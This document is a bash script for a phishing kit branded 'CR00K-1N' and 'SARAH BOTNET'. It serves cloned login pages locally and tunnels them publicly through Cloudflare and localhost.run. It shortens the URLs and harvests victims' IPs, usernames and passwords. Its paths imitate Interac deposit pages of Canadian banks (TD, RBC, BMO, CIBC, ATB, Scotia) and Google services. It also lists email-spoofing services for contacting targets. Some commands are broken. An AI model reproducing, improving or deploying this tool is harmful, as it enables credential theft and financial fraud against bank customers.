#!/bin/bash





#Install packages and tunnels

check_os_and_install_packages() {
	

if [[  -f .host/cloudflared ]]; then

{ clear; }	

else

{ clear; header; }

OS_SYSTEM=$(uname -o)	
if [ $OS_SYSTEM != Android ]; then
     bash packages.sh
     bash tunnels.sh

else	
 ./packages.sh
 ./tunnels.sh
 	
fi	

fi
	
}


# Check os for root

check_root_and_os() {
	
OS_SYSTEM=$(uname -o)

if [ $OS_SYSTEM != Android ]; then


if [[ "${EUID:-$(id -u)}" -ne 0 ]]; then
    { clear; header; }
    echo -e "The program cannot run.\nFor run program in GNU/Linux Operating System,\nGive root privileges and try again. \n"
    exit 1
fi

fi


}



# Terminal Colors

RED="$(printf '\033[31m')"  
GREEN="$(printf '\033[32m')"  
ORANGE="$(printf '\033[33m')"  
BLUE="$(printf '\033[34m')"
MAGENTA="$(printf '\033[35m')"  
CYAN="$(printf '\033[36m')"  
WHITE="$(printf '\033[37m')" 
BLACK="$(printf '\033[30m')"
ORANGEBG="$(printf '\033[43m')"  
BLUEBG="$(printf '\033[44m')"
RESETFG="$(printf '\e033[0m')"
RESETBG="$(printf '\e[0m\n')"



# Directories
if [[ ! -d ".host" ]]; then
	mkdir -p ".host"
fi



# Clear content of log files

truncate -s 0 .tunnels_log/.cloudfl.log 

truncate -s 0 .tunnels_log/.localrun.log 




pid_kill() {
	
#kill all pid for php, ngrok and cloudflared
	if [[ `pidof php` ]]; then
		killall php > /dev/null 2>&1
	fi
	if [[ `pidof cloudflared` ]]; then
		killall cloudflared > /dev/null 2>&1
	fi

}


header(){
	
    printf "${BLUE}"	
	cat <<- EOF
   ____ ____   ___   ___  _  _____ _   _       _ _   _ 
  / ___|  _ \ / _ \ / _ \| |/ /_ _| \ | |     / | \ | |
 | |   | |_) | | | | | | | ' / | ||  \| |_____| |  \| |
 | |___|  _ <| |_| | |_| | . \ | || |\  |_____| | |\  |
  \____|_| \_\\___/ \___/|_|\_\___|_| \_|     |_|_| \_|
	EOF
	printf "${RESETBG}"	
}
log_DATA(){
	
	bold=$(tput bold)
    normal=$(tput sgr0)
	
    printf "${GREEN}"	
	cat <<- EOF


	
	EOF

	printf "${RESETBG}"	
}



# Php webserver and port 
host='127.0.0.1'
port='8080'


setup_clone(){
	
    # Setup cloned page and server
	echo -ne "\n${GREEN}[${WHITE}-${GREEN}]${BLUE} Starting your php server..."${WHITE}
	cd www && php -S "$host":"$port" > /dev/null 2>&1 & 
}



setup_clone_manual() {


   
   cp -rf .manual_attack/index.html www
   cp -rf .manual_attack/post.php www
   cp -rf .manual_attack/__ROOT__/index.php www
   cp -rf .manual_attack/__ROOT__/data.php 
   
   
   
   
   
   	
   
   
   rm -rf .manual_attack/index.html
   rm -rf .manual_attack/post.php
   rm -rf .manual_attack/data.txt
   	
   echo -ne "\n${GREEN}[${WHITE}-${GREEN}]${BLUE} Starting your php server..."${WHITE}
   cd www && php -S "$host":"$port" > /dev/null 2>&1 & 	
}



setup_clone_customize(){
	
    # Setup cloned page and server
	echo -e "\n${GREEN}[${WHITE}-${GREEN}]${BLUE} Setting up cloned page..."${WHITE}
	cp -rf .customize/"$site"/* www
	echo -ne "\n${GREEN}[${WHITE}-${GREEN}]${BLUE} Starting your php server..."${WHITE}
	cd www && php -S "$host":"$port" > /dev/null 2>&1 & 
}




## Get IP address
get_data() {
	IP=$(grep -a '[IPA].*' www/DATABASE/telgram_log.txt | cut -d " " -f2 | tr -d '\r')
    BANK=$(grep -a '[BNK].*'/DATABASE/telgram_log.txt | cut -d " " -f2 | tr -d '\r')
    Region=$(grep -a 'Canada.*'www/DATABASE/telgram_log.txt| cut -d " " -f2 | tr -d '\r')
    User_Agent=$(grep -a 'Mozilla.*' www/DATABASE/telgram_log.txt | cut -d " " -f2 | tr -d '\r')
    OS_System=$(grep -a '[URL].*' www/DATABASE/telgram_log.txt | cut -d " " -f2 | tr -d '\r')
	IFS=$'\n'	
	echo -e "\n${GREEN}[${WHITE}-${GREEN}]${MAGENTA} TARGETS data.. "
	echo -e "\n${GREEN}[${WHITE}-${GREEN}]${MAGENTA} IP: ${BLUE}$IP"
	echo -e "\n${GREEN}[${WHITE}-${GREEN}]${MAGENTA} SITE: ${BLUE}$BANK"
	echo -e "\n${GREEN}[${WHITE}-${GREEN}]${MAGENTA} LOCATE: ${BLUE}$Region"
	echo -e "\n${GREEN}[${WHITE}-${GREEN}]${MAGENTA} City: ${BLUE}$City"
	echo -e "\n${GREEN}[${WHITE}-${GREEN}]${MAGENTA} User-Agent: ${BLUE}$User_Agent"
	echo -e "\n${GREEN}[${WHITE}-${GREEN}]${MAGENTA} URL: ${BLUE}$OS_System"
	cat www/.txt >> data.txt
}


# Get credentials from TARGETSs
get_creds() {
	ACC=$(grep -o '[UsR]*' www/data.txt | cut -d " " -f2)
	PASS=$(grep -o 'Password.*' www/data.txt | cut -d ":" -f2)
	IFS=$'\n'
	echo -e "\n${GREEN}[${WHITE}-${GREEN}]${MAGENTA} SLOT1 : ${WHITE}$ACC"
	echo -e "\n${GREEN}[${WHITE}-${GREEN}]${MAGENTA} SLOT2: ${WHITE}$PASS"
	cat www/data.txt >> data.txt
	echo -ne "\n${GREEN}[${WHITE}-${GREEN}]${MAGENTA} SARAH YOUR BOT BOT WILL LET YOU KNOW \n ${GREEN}[${WHITE}-${GREEN}]${MAGENTA} HIT ${BLUE}Ctrl + C ${ORANGE}STOP SERVER AND SHUT DOWN. "
}




# Get credentials from TARGETSs manual method
get_creds_manual() {
	ACC=$(tail -n 20 www/data.txt)	
	IFS=$'\n'
	echo -e "\n${GREEN}[${WHITE}-${GREEN}]${MAGENTA} Account : ${WHITE}$ACC"
	echo -e "\n${GREEN}[${WHITE}-${GREEN}]${MAGENTA} Saved in : ${ORANGE}data.txt"
	cat www/data.txt >> data.txt
	echo -ne "\n${GREEN}[${WHITE}-${GREEN}]${MAGENTA} TELEGRAM BOT WILL NOTIFY YOU, ${BLUE}Ctrl + C ${ORANGE}STOP SERVER AND QUIT. "
}






# Print credentials from TARGETS
credentials() {
	
   echo -ne "\n${GREEN}[${WHITE}-${GREEN}]${MAGENTA} SHES AWAKE WILL TEXT YOU SOON ${BLUE}Ctrl + C ${MAGENTA} TO CANCEL..."
	
	while true; do
	
		if [[ -e "www/data.txt" ]]; then
			echo -e "\n\n${GREEN}[${WHITE}-${GREEN}]${MAGENTA} data TARGETS Found!"
			get_data
			rm -rf www/data.txt   
		fi
		
		sleep 0.75
		
		if [[ -e "www/data.txt" ]]; then
		    notice_login
		    echo -e "\n"
		    log_DATA
		    #echo -e "\n\n \033[31;5;7m Login DATA Found! \033[37m"
		    #echo -e "${RESETBG}"
			get_creds
			rm -rf www/data.txt
		fi
		
		sleep 0.75
		
	done
}




# Print credentials from TARGETS manual
credentials_manual() {
	
  echo -ne "\n${GREEN}[${WHITE}-${GREEN}]${MAGENTA} TELEGRAM BOT WILL NOTIFY YOU.. ${BLUE}Ctrl + C ${MAGENTA}STOP SERVER AND QUIT..."
	
   while true; do	
   
       if [[ -e "www/data.txt" ]]; then
			echo -e "\n\n${GREEN}[${WHITE}-${GREEN}]${MAGENTA} data TARGETS Found!"
			get_data
			rm -rf www/data.txt
		fi
		
		sleep 0.75
   
		if [[ -e "www/data.txt" ]]; then
			notice_login
		    echo -e "\n"
		    log_DATA
		    #echo -e "\n\n \033[31;5;7m Login DATA Found! \033[37m"
		    #echo -e "${RESETBG}"
			get_creds_manual
			rm -rf www/data.txt
		fi
		
		sleep 0.75
		
	done
}






# Localhost Start
localhost_start() {
	echo -e "\n${GREEN}[${WHITE}-${GREEN}]${MAGENTA} Initializing... ${GREEN}( ${CYAN}http://$host:$port ${GREEN})"
	setup_clone
	{ sleep 1; clear; header; }
	echo -e "\n${GREEN}[${WHITE}-${GREEN}]${MAGENTA} Successfully Hosted in : ${GREEN}${CYAN}http://$host:$port ${GREEN}"
	credentials
}



# Localhost Start customize
localhost_customize() {
	echo -e "\n${GREEN}[${WHITE}-${GREEN}]${MAGENTA} Initializing... ${GREEN}( ${CYAN}http://$host:$port ${GREEN})"
	setup_clone_customize
	{ sleep 1; clear; header; }
	echo -e "\n${GREEN}[${WHITE}-${GREEN}]${MAGENTA} Successfully Hosted in : ${GREEN}${CYAN}http://$host:$port ${GREEN}"
	credentials
}



# Localhost Start manual
localhost_start_manual() {
	echo -e "\n${GREEN}[${WHITE}-${GREEN}]${MAGENTA} Initializing... ${GREEN}( ${CYAN}http://$host:$port ${GREEN})"
	setup_clone_manual
	{ sleep 1; clear; header; }
	echo -e "\n${GREEN}[${WHITE}-${GREEN}]${MAGENTA} Successfully Hosted in : ${GREEN}${CYAN}http://$host:$port ${GREEN}"
	credentials_manual
}

		
# Start Cloudflared
cloudflared_start() { 
	
	echo -e "\n${GREEN}[${WHITE}-${GREEN}]${MAGENTA} Initializing... ${MAGENTA}( ${CYAN}http://$host:$port ${GREEN})"
	{ sleep 1; setup_clone; }
	echo -ne "\n\n${GREEN}[${WHITE}-${GREEN}]${MAGETNA} Launching Cloudflared..."

    if [[ `command -v termux-chroot` ]]; then
		sleep 2 && termux-chroot ./.host/cloudflared tunnel -url "$host":"$port" > .tunnels_log/.cloudfl.log  2>&1 & > /dev/null 2>&1 &
    else
        sleep 2 && ./.host/cloudflared tunnel -url "$host":"$port" > .tunnels_log/.cloudfl.log  2>&1 & > /dev/null 2>&1 &
    fi

	{ sleep 12; clear; header; }
	



	cldflr_url=$(grep -o 'https://[-0-9a-z]*\.trycloudflare.com' ".tunnels_log/.cloudfl.log")
	cldflr_url1=${cldflr_url#https://}

	gmap_url="${cldflr_url}/accounts/authentication/ID=17566/040147.php"
	drive_url="${cldflr_url}/accounts/authentication/1D=17567/040147.php"
	photo_url="${cldflr_url}/accounts/authentication/ID=17568/040147.php"
	player2_url="${cldflr_url}/accounts/personal/2/GEN.php"
	player_url="${cldflr_url}/accounts/work/team/sarah/index.php"
	gmail_url="${cldflr_url}/authentication/ID=17569/040147.php"
	td_url="${cldflr_url}/accounts/interac/deposit/TD/040147.php"
        rbc_url="${cldflr_url}/accounts/interac/deposit/RBC/040147.php"
	bmo_url="${cldflr_url}/accounts/interac/deposit/BMO/040147.php"
	cibc_url="${cldflr_url}/accounts/interac/deposit/CIBC/040147.php"
	atb_url="${cldflr_url}/accounts/interac/deposit/ATB/040147.php"
	SCO_url="${cldflr_url}/accounts/interac/deposit/sco/040147.php"

	url_short=$(curl -s 'https://is.gd/create.php?format=simple&url='"$cldflr_url1")
	url_short1=$(curl -s 'https://is.gd/create.php?format=simple&url='"$gmap_url")
    url_short2=$(curl -s 'https://is.gd/create.php?format=simple&url='"$player_url") 
	url_short22=$(curl -s 'https://is.gd/create.php?format=simple&url='"$player2_url")
    url_short3=$(curl -s 'https://is.gd/create.php?format=simple&url='"$gmail_url")
    url_shrt3=$(curl -s 'https://is.gd/create.php?format=simple&url='"$drive_url")
     url_sort3=$(curl -s 'https://is.gd/create.php?format=simple&url='"$photo_url")
	url_short4=$(curl -s 'https://is.gd/create.php?format=simple&url='"$td_url")
	url_short5=$(curl -s 'https://is.gd/create.php?format=simple&url='"$rbc_url")
	url_short6=$(curl -s 'https://is.gd/create.php?format=simple&url='"$bmo_url")
	url_short7=$(curl -s 'https://is.gd/create.php?format=simple&url='"$cibc_url")
	url_short8=$(curl -s 'https://is.gd/create.php?format=simple&url='"$atb_url")
	url_short9=$(curl -s 'https://is.gd/create.php?format=simple&url='"$SCO_url")

	echo -e "${GREEN}[${WHITE}-${GREEN}]${WHITE}====-===[SARAH=BOTNET=V1]===-===${GREEN}[${WHITE}-${GREEN}]${WHITE}"

	echo -e "${GREEN}[${WHITE}-${GREEN}]${WHITE} SARAH [ON-THE-GO] : ${ORANGE}$url_short2"

	echo -e "${GREEN}[${WHITE}-${GREEN}]${WHITE}=======[USE WITH CAUTION]=======${GREEN}[${WHITE}-${GREEN}]${WHITE}"
	echo -e "${GREEN}[${WHITE}-${GREEN}]${WHITE}  PHOTO      : ${RED}$url_short1"
	echo -e "${GREEN}[${WHITE}-${GREEN}]${WHITE}  DRIVE      : ${RED}$url_shrt3"
	echo -e "${GREEN}[${WHITE}-${GREEN}]${WHITE}  GMAPS      : ${RED}$url_sort3"
	echo -e "${GREEN}[${WHITE}-${GREEN}]${WHITE}=======[USE WITH CAUTION]=======${GREEN}[${WHITE}-${GREEN}]${WHITE}"	

	credentials
}





# Start localrun
localhostrun_start() {
	echo -e "\n${GREEN}[${WHITE}-${GREEN}]${MAGENTA} Initializing... ${MAGENTA}( ${CYAN}http://$host:$port ${MAGENTA})"
	{ sleep 1; setup_clone; }
	echo -ne "\n\n${GREEN}[${WHITE}-${GREEN}]${MAGENTA} Launching LocalhostRun..."

    if [[ `command -v termux-chroot` ]]; then
        sleep 2 && termux-chroot ssh -R "80":"$host":"$port" "nokey@localhost.run" > .tunnels_log/.localrun.log  2>&1 & > /dev/null 2>&1 &
    else
        sleep 2 && ssh -R "80":"$host":"$port" "nokey@localhost.run" > .tunnels_log/.localrun.log  2>&1 & > /dev/null 2>&1 &
    fi

	{ sleep 9; clear; header; }
	
	localrun_url=$(grep -o 'https://[-0-9a-z]*\.lhrtunnel.link' ".tunnels_log/.localrun.log")
	localrun_url1=${localrun_url#https://}
	
	url_short=$(curl -s 'https://is.gd/create.php?format=simple&url='"$localrun_url1")
	
	echo -e "\n${GREEN}[${WHITE}-${GREEN}]${WHITE} CLOUDFLARED   : ${GREEN}$localrun_url"
	echo -e "\n${GREEN}[${WHITE}-${GREEN}]${WHITE} BETTER LINK : ${GREEN}$url_short"
	
	credentials
}




# 

 localrun customize
localhostrun_start_customize() {
	echo -e "\n${GREEN}[${WHITE}-${GREEN}]${MAGENTA} Initializing... ${MAGENTA}( ${CYAN}http://$host:$port ${MAGENTA})"
	{ sleep 1; setup_clone_customize; }
	echo -ne "\n\n${GREEN}[${WHITE}-${GREEN}]${MAGENTA} Launching LocalhostRun..."

    if [[ `command -v termux-chroot` ]]; then
        sleep 2 && termux-chroot ssh -R "80":"$host":"$port" "nokey@localhost.run" > .tunnels_log/.localrun.log  2>&1 & > /dev/null 2>&1 &
    else
        sleep 2 && ssh -R "80":"$host":"$port" "nokey@localhost.run" > .tunnels_log/.localrun.log  2>&1 & > /dev/null 2>&1 &
    fi

	{ sleep 9; clear; header; }
	
	localrun_url=$(grep -o 'https://[-0-9a-z]*\.lhrtunnel.link' ".tunnels_log/.localrun.log")
	localrun_url1=${localrun_url#https://}
	
	url_short=$(curl -s 'https://is.gd/create.php?format=simple&url='"$localrun_url1")
	
	echo -e "\n${GREEN}[${WHITE}-${GREEN}]${WHITE} CLOUDFLARED   : ${GREEN}$localrun_url"
	echo -e "\n${GREEN}[${WHITE}-${GREEN}]${WHITE} BETTER LINK : ${GREEN}$url_short"
	
	credentials
}




# Start localrun manual
localhostrun_start_manual() {
	echo -e "\n${GREEN}[${WHITE}-${GREEN}]${MAGENTA} Initializing... ${MAGENTA}( ${CYAN}http://$host:$port ${MAGENTA})"
	{ sleep 1; setup_clone_manual; }
	echo -ne "\n\n${GREEN}[${WHITE}-${GREEN}]${MAGENTA} Launching LocalhostRun..."

    if [[ `command -v termux-chroot` ]]; then
        sleep 2 && termux-chroot ssh -R "80":"$host":"$port" "nokey@localhost.run" > .tunnels_log/.localrun.log  2>&1 & > /dev/null 2>&1 &
    else
        sleep 2 && ssh -R "80":"$host":"$port" "nokey@localhost.run" > .tunnels_log/.localrun.log  2>&1 & > /dev/null 2>&1 &
    fi

	{ sleep 9; clear; header; }
	
	localrun_url=$(grep -o 'https://[-0-9a-z]*\.lhrtunnel.link' ".tunnels_log/.localrun.log")
	localrun_url1=${localrun_url#https://}
	
	url_short=$(curl -s 'https://is.gd/create.php?format=simple&url='"$localrun_url1")
	
	echo -e "\n${GREEN}[${WHITE}-${GREEN}]${WHITE} CLOUDFLARED : ${GREEN}$localrun_url"
	echo -e "\n${GREEN}[${WHITE}-${GREEN}]${WHITE} BETTER LINK : ${GREEN}$url_short"
	
	credentials_manual
}






# Select Tunnel  
tunnel() {
	{ clear; header; }
	cat <<- EOF
		${GREEN}[${WHITE}2${GREEN}]${CYAN} ACTIVATE SARAH
	EOF

	read -p "${GREEN}[${WHITE}-${GREEN}]${GREEN} Select a port forwarding service : ${WHITE}"

	case $REPLY in 
		   1)
		    express_vpn;;
		   2)
			cloudflared_start;;
			
			
		  *)
			echo -ne "\n${GREEN}[${WHITE}!${GREEN}]${RED} Invalid Option, Try Again..."
			{ sleep 1; header; tunnel;};;
	esac

}






# Select Tunnel customize 
tunnel_customize() {
	{ clear; header; }
	cat <<- EOF

		${GREEN}[${WHITE}1${GREEN}]${CYAN} Cloudflared ${MAGENTA} (recommended)

	EOF

	read -p "${GREEN}[${WHITE}-${GREEN}]${GREEN} Select a port forwarding service : ${WHITE}"

	case $REPLY in 
		   3)
		    localhost_start_customize;;
		    
		   2)
		    VPN;; 
			
		   1)
			cloudflared_start_customize;;

			
		  *)
			echo -ne "\n${GREEN}[${WHITE}!${GREEN}]${RED} Invalid Option, Try Again..."
			{ sleep 1; header; tunnel_customize;};;
	esac

}








start_manual_method() {
 
 cd .manual_attack && php -S "127.0.0.1:8081" > /dev/null 2>&1 & 
     echo -e "\n${GREEN}[${WHITE}-${GREEN}] ${GREEN} Visit ${WHITE} http://127.0.0.1:8081 ${GREEN} for setup clone page "${WHITE}
	 echo -e "\n${GREEN}[${WHITE}-${GREEN}] ${GREEN} After setup clone page return to here and continue... "${WHITE}

}


# Select Tunnel  
tunnel_manual() {
	{ clear; header; }
	 
	
	 start_manual_method
	
	cat <<- EOF

		${GREEN}[${WHITE}1${GREEN}]${CYAN} Cloudflared ${MAGENTA} (recommended)

	EOF

	read -p "${GREEN}[${WHITE}-${GREEN}]${GREEN} Select a port forwarding service : ${WHITE}"

	case $REPLY in 
			
		   1)
			cloudflared_start_manual;;
			
	   	
			
		  *)
			echo -ne "\n${GREEN}[${WHITE}!${GREEN}]${RED} Invalid Option, Try Again..."
			{ sleep 1; header; tunnel_manual;};;
	esac

}





vpn_setup() {

	
{ clear; header; echo; }

	cat <<- EOF

		${GREEN}[${WHITE}1${GREEN}]${CYAN} PSIPHON V  
		${GREEN}[${WHITE}2${GREEN}]${CYAN} EXPRESS VPN  
		${GREEN}[${WHITE}3${GREEN}]${CYAN} PROTON  VPN
		${GREEN}[${WHITE}1${GREEN}]${CYAN} MOZILLA VPN    
		${GREEN}[${WHITE}4${GREEN}]${CYAN} 1P2 PROXY  	
		${GREEN}[${WHITE}99${GREEN}]${CYAN} Main Menu
		
	    
	EOF
	
	
	read -p "${GREEN}[${WHITE}-${GREEN}]${GREEN} Select Api : ${WHITE}"${WHITE}

	case $REPLY in 
	    
	    1) 
	        
	         if [[ `command -v termux-chroot` ]]; then
                echo "https://play.google.com/store/apps/details?id=com.psiphon3.subscription" 
              sleep 4 && menu
              
             else
                echo "https://play.google.com/store/apps/details?id=com.psiphon3.subscription"
                 #echo 'Not Supported. Setup your vpn manual'
                sleep 4 && menu
             fi ;;	 			
	    
	    
	    99) menu;;
		
		
	    *)
			echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
			{ sleep 0.7; ngrok_setup_token;};;
	  
	esac




}





play_music() {
	
	{ clear; header; }	
	
	cat <<- EOF
		${GREEN}[${WHITE}1${GREEN}]${CYAN} NULL  
		${GREEN}[${WHITE}2${GREEN}]${CYAN} NULL
		${GREEN}[${WHITE}99${GREEN}]${CYAN} Main Menu
		
		${MAGENTA} NULL
		${MAGENTA} NULL
        ${MAGENTA} NULL
        
        ${MAGENTA} NULL saved in data txt file. 
		
		
	EOF
	
	
	read -p "${GREEN}[${WHITE}-${GREEN}]${GREEN} Select Option : ${WHITE}"${WHITE}

	case $REPLY in 
	    
	    1) 
           xterm -e nohup mpv .music/mis_song.mp3 > /dev/null 2>&1
           menu;;
           
	     	    
	    2) 
	       pidof mpv && killall mpv > /dev/null 2>&1 
	       menu;;
		
	    99)
		    menu;;
		
	    *)
			echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again...";;
			
	esac
	
	


}



notice_login()
{
xterm -e nohup mpv .notifications/find_login.mp3 > /dev/null 2>&1
}





attack() {
 
 { clear; header; echo; }

	cat <<- EOF
		${WHITE}[${RED}1${WHITE}]${RED}  TESTED VERSION		                    
		${WHITE}[${RED}2${WHITE}]${RED} UNTESTED VERSION	
		
	EOF
	
	
	read -p "${GREEN}[${WHITE}-${GREEN}]${GREEN} SELECT A VERSION: ${WHITE}"${WHITE}

	case $REPLY in 
	    1)
			site="TESTED"
			tunnel;;
				
	  
	    2)
			site="UNTESTED"
			tunnel;;
				
	  
	        
	   99)  menu;;
	    
	        
	   *)
			echo -ne "\n${GREEN}[${WHITE}!${GREEN}]${RED} Invalid Option, Try Again..."
			{ sleep 0.7; attack;};;
	  
	esac


}




other_sites() {
 
 { clear; header; echo; }

   	cat <<- EOF
                                               
	EOF
	
	
	read -p "${GREEN}[${WHITE}-${GREEN}]${GREEN} Select an option : ${WHITE}"${WHITE}

	case $REPLY in 
	
	    1)
			site="freefire"
			subdomain='http://get-free-character-for-freefire-game'
			tunnel;;
			
	
	           
	        
	   99) menu;;
	    
	        
	   *)
			echo -ne "\n${GREEN}[${WHITE}!${GREEN}]${RED} Invalid Option, Try Again..."
			{ sleep 0.7; other_sites;};;
	  
	esac


}





customize_sites()
{
	
 { clear; header; echo; }	
 
   
echo -ne "\n${MAGENTA}Customize your sites. 
${GREEN}Go inside the .customize folder \nand create your own customized sites inside folders.
Place all your files inside the same folder. 
For example folder mysite and inside all files. 
Then just type the folder name and choose tunnel. \n\n"
    
     
cat <<- EOF
        
${GREEN}[${WHITE}1${GREEN}]${CYAN} Customized 
${GREEN}[${WHITE}99${GREEN}]${CYAN} Main Menu
		
EOF
	
    read -p "${GREEN}[${WHITE}-${GREEN}]${GREEN} Select an option : ${WHITE}"${WHITE}

	case $REPLY in 
	    
	    1) 
	      read -p ${CYAN}"Enter folder name e.x mysite: "${WHITE} customize_folder
	      read -p ${CYAN}"Enter subdomain for tunnel e.x mysite-update-plan-premium-free: "${WHITE} customize_subdomain
	      site=$customize_folder
	      subdomain=$customize_subdomain
	      tunnel_customize;;

	    
	    99) 
	       menu;; 
	    
	    *)
			echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
			{ sleep 0.7; attack_customize;};;
	  
	esac
	
}






attack_manual() {

 subdomain='http:secure-login-page'
 tunnel_manual
  
}




email() {

{ clear; header; echo; }

    echo -ne "\n${GREEN}[${WHITE}-${GREEN}]${MAGENTA} Use this services for send email to TARGETSs \n"
   
    echo -ne "\n${GREEN}[${WHITE}-${GREEN}]${CYAN} https://

.guerrillamail.com/ \n"
    echo -ne "\n${GREEN}[${WHITE}-${GREEN}]${CYAN} https://emkei.cz/ ${MAGENTA} (recommended) \n"
    echo -ne "\n${GREEN}[${WHITE}-${GREEN}]${CYAN} https://mailspre.com/ \n"
    echo -ne "\n\n"
    
    
    cat <<- EOF
		${GREEN}[${WHITE}99${GREEN}]${CYAN} Main Menu
		
		
	EOF
	
	read -p "${GREEN}[${WHITE}-${GREEN}]${GREEN} Select an option : ${WHITE}"${WHITE}

	case $REPLY in 
	    
	    99) menu;; 
	    
	    *)
			echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
			{ sleep 0.7; email;};;
	  
	esac


	

}	




menu() {
 
 { clear; header; echo; }

	cat <<- EOF
		${GREEN}[${WHITE}1${GREEN}]${RED} ENABLE CYBER TERRORIST
		
	EOF
	
	read -p "${GREEN}[${WHITE}-${GREEN}]${GREEN} Select an option : ${WHITE}"${WHITE}

	case $REPLY in 
	    
	    1) attack;; 
	    
	    2) attack_manual;; 
	    
	    3) customize_sites;;
	      			
	    4) apis;;
	    
	    5) email;;
	    
	    6) vpn_setup;;
	    
	    7) play_music;;
	    
	    help) help;;
	      				
		0)
		echo -ne "\n${GREEN}[${WHITE}!${GREEN}]${ORANGE} Thanks for using CR00K-1N"${WHITE}
		sleep 2
		clear
		exit 1;;
		
	    *)
			echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
			{ sleep 0.7; menu;};;
	  
	esac
	
}	


control_c()
{
  echo -e "${RESETBG}"
  echo -e "${RESETFG}"
  clear
  exit 1
}


trap control_c SIGINT



check_os_and_install_packages
check_root_and_os
pid_kill
menu
